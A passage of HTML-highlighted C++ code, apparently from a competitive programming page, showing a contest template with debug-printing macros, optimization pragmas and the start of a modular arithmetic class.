</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">140
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">141
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">142
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">143
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">144
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">145
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">146
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">147
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">148
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">149
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">150
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">151
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">152
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">153
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">154
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">155
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">156
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">157
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">158
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">159
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">160
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">161
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">162
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">163
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">164
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">165
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">166
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">167
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">168
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">169
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">170
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">171
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">172
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">173
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">174
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">175
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">176
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">177
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">178
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">179
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">180
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">181
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">182
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">183
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">184
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">185
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">186
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">187
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">188
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">189
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">190
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">191
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">192
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">193
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>//   __________________
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  | ________________ |
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  ||          ____  ||
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  ||   /\    |      ||
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  ||  /__\   |      ||
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  || /    \  |____  ||
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  ||________________||
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  |__________________|
</span></span></span><span style=display:flex><span><span style=color:#75715e>//  \###################\Q
</span></span></span><span style=display:flex><span><span style=color:#75715e>//   \###################\Q
</span></span></span><span style=display:flex><span><span style=color:#75715e>//    \        ____       \B
</span></span></span><span style=display:flex><span><span style=color:#75715e>//     \_______\___\_______\X
</span></span></span><span style=display:flex><span><span style=color:#75715e>// An AC a day keeps the doctor away.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> 
</span></span><span style=display:flex><span><span style=color:#75715e>// clang-format off
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>/*{{{*/</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#ifdef local
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>// #define _GLIBCXX_DEBUG AC
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;bits/extc++.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define safe std::cerr&lt;&lt;__PRETTY_FUNCTION__&lt;&lt;&#34; line &#34;&lt;&lt;__LINE__&lt;&lt;&#34; safe\n&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define debug(args...) qqbx(#args, args)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define TAK(args...) std::ostream&amp; operator&lt;&lt;(std::ostream &amp;O, args)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NIE(STL, BEG, END, OUT) template &lt;typename ...T&gt; TAK(std::STL&lt;T...&gt; v) \
</span></span></span><span style=display:flex><span><span style=color:#75715e>    { O &lt;&lt; BEG; int f=0; for(auto e: v) O &lt;&lt; (f++ ? &#34;, &#34; : &#34;&#34;) &lt;&lt; OUT; return O &lt;&lt; END; }
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>NIE(deque, <span style=color:#e6db74>&#34;[&#34;</span>, <span style=color:#e6db74>&#34;]&#34;</span>, e) ; NIE(vector, <span style=color:#e6db74>&#34;[&#34;</span>, <span style=color:#e6db74>&#34;]&#34;</span>, e)
</span></span><span style=display:flex><span>NIE(set, <span style=color:#e6db74>&#34;{&#34;</span>, <span style=color:#e6db74>&#34;}&#34;</span>, e) ; NIE(multiset, <span style=color:#e6db74>&#34;{&#34;</span>, <span style=color:#e6db74>&#34;}&#34;</span>, e) ; NIE(unordered_set, <span style=color:#e6db74>&#34;{&#34;</span>, <span style=color:#e6db74>&#34;}&#34;</span>, e)
</span></span><span style=display:flex><span>NIE(map , <span style=color:#e6db74>&#34;{&#34;</span>, <span style=color:#e6db74>&#34;}&#34;</span>, e.first <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#f92672>&lt;&lt;</span> e.second)
</span></span><span style=display:flex><span>NIE(unordered_map , <span style=color:#e6db74>&#34;{&#34;</span>, <span style=color:#e6db74>&#34;}&#34;</span>, e.first <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#f92672>&lt;&lt;</span> e.second)
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> ...T<span style=color:#f92672>&gt;</span> TAK(std<span style=color:#f92672>::</span>pair<span style=color:#f92672>&lt;</span>T...<span style=color:#f92672>&gt;</span> p) { <span style=color:#66d9ef>return</span> O <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;(&#39;</span> <span style=color:#f92672>&lt;&lt;</span> p.first <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;,&#39;</span> <span style=color:#f92672>&lt;&lt;</span> p.second <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#39;)&#39;</span>; }
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T, size_t N<span style=color:#f92672>&gt;</span> TAK(std<span style=color:#f92672>::</span>array<span style=color:#f92672>&lt;</span>T,N<span style=color:#f92672>&gt;</span> a) { <span style=color:#66d9ef>return</span> O <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>vector<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span>(a.begin(), a.end()); }
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> ...T<span style=color:#f92672>&gt;</span> TAK(std<span style=color:#f92672>::</span>tuple<span style=color:#f92672>&lt;</span>T...<span style=color:#f92672>&gt;</span> t) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> O <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;(&#34;</span>, std<span style=color:#f92672>::</span>apply([<span style=color:#f92672>&amp;</span>O](T ...s){ <span style=color:#66d9ef>int</span> f<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; (..., (O <span style=color:#f92672>&lt;&lt;</span> (f<span style=color:#f92672>++</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;, &#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>) <span style=color:#f92672>&lt;&lt;</span> s)); }, t), O <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;)&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> ...T<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>void</span> qqbx(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s, T ...args) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> cnt <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>...(T);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>cnt) <span style=color:#66d9ef>return</span> std<span style=color:#f92672>::</span>cerr <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[1;32m() = ()</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>\[0m</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#66d9ef>void</span>();
</span></span><span style=display:flex><span>    (std<span style=color:#f92672>::</span>cerr <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[1;32m(&#34;</span> <span style=color:#f92672>&lt;&lt;</span> s <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;) = (&#34;</span> , ... , (std<span style=color:#f92672>::</span>cerr <span style=color:#f92672>&lt;&lt;</span> args <span style=color:#f92672>&lt;&lt;</span> (<span style=color:#f92672>--</span>cnt <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;, &#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;)</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>#else
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma GCC optimize(&#34;Ofast&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#pragma loop_opt(on)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;bits/extc++.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;bits/stdc++.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define debug(...) ((void)0)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define safe ((void)0)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#endif </span><span style=color:#75715e>// local
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define pb emplace_back
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define all(v) begin(v),end(v)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define mem(v,x) memset(v,x,sizeof v)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ff first
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ss second
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> T, T MOD<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Modular</span> {
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>constexpr</span> Modular() <span style=color:#f92672>:</span> v() {}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> U<span style=color:#f92672>&gt;</span> Modular(<span style=color:#66d9ef>const</span> U <span style=color:#f92672>&amp;</span>u) { v <span style=color:#f92672>=</span> (<span style=color:#ae81ff>0</span> <span style=color:#f92672>&lt;=</span> u <span style=color:#f92672>&amp;&amp;</span> u <span style=color:#f92672>&lt;</span> MOD <span style=color:#f92672>?</span> u : (u<span style=color:#f92672>%</span>MOD<span style=color:#f92672>+</span>MOD)<span style=color:#f92672>%</span>MOD); }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>template</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>typename</span> U<span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>explicit</span> <span style=color:#66d9ef>operator</span> U() <span style=color:#66d9ef>const</span> { <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>U</span>(v); }
</span></span><span style=display:flex><span>    T <span style=color:#a6e22e>operator</span>()() <span style=color:#66d9ef>const</span> { <span style=color:#66d9ef>return</span> v; }
</span></span><span style=display:flex><span><span style=color:#75715e>#define REFOP(type, expr...) Modular &amp;operator type (const Modular &amp;rhs) { return expr, *this; }
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    REFOP(<span style=color:#f92672>+=</span>, v <span style=color:#f92672>+=</span> rhs.v <span style=color:#f92672>-</span> MOD, v <span style=color:#f92672>+=</span> MOD <span style=color:#f92672>&amp;</span> (v <span style=color:#f92672>&gt;&gt;</span> width)) ; REFOP(<span style=color:#f92672>-=</span>, v <span style=color:#f92672>-=</span> rhs.v, v <span style=color:#f92672>+=</span> MOD <span style=color:#f92672>&amp;</span> (v <span style=color:#f92672>&gt;&gt;</span> width))
</span></span><span style=display:flex><span>    <span style=color:#75715e>// fits for MOD^2 &lt;= 9e18
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    REFOP(<span style=color:#f92672>*=</span>, v <span style=color:#f92672>=</span> <span style=color:#66d9ef>static_cast</span><span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span>(<span style=color:#ae81ff>1LL</span> <span style=color:#f92672>*</span> v <span style=color:#f92672>*</span> rhs.v <span style=color:#f92672>%</span> MOD)) ; REFOP(<span style=color:#f92672>/=</span>, <span style=color:#f92672>*</span><span style=color:#66d9ef>this</span> <span style=color:#f92672>*=</span> inverse(rhs.v))
</span></span><span style=display:flex><span><span style=color:#75715e>#define VALOP(op) friend Modular operator op (Modular a, const Modular &amp;b) { return a op##= b; }
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    VALOP(<span style=color:#f92672>+</span>) ; VALOP(<span style=color:#f92672>-</span>) ; VALOP(<span style=color:#f92672>*</span>) ; VALOP(<span style=color:#f92672>/</span>)
